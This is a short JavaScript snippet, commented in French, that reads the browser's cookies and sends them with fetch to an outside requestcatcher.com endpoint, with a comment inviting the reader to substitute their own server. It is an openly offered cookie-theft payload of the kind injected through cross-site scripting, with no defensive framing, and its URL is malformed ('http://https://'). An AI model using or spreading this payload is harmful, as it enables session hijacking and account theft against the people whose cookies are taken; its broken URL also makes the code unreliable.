// Récupère les cookies du navigateur
const cookies = document.cookie;

// Envoie les cookies à ton serveur web
const url = 'http://https://dqss.requestcatcher.com/cookies';  // remplace par ton serveur

// Méthode 1 : avec fetch
fetch(url + '?data=' + encodeURIComponent(cookies));
